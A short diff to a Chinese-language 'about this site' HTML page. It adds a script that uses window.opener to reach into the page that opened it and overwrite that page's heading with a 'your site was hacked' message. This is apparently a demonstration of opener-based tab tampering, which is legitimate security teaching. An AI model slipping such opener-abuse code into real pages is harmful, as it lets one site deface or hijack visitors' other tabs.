@@ -14,6 +14,16 @@
     <h1>關於本站</h1>
     <p>關於本站的資訊</p>
     <a href="./index.html">回到首頁</a>
+
+    <script>
+        // 如果瀏覽器支援opener API
+        if (window.opener) {
+            // 取得上一個頁面的視窗物件
+            var prevWindow = window.opener;
+            var prevDocument = prevWindow.document;
+            prevDocument.querySelectorAll('h1')[0].innerText = '你的網站被我Hacked了！';
+        }
+    </script>
 </body>
 
 </html>
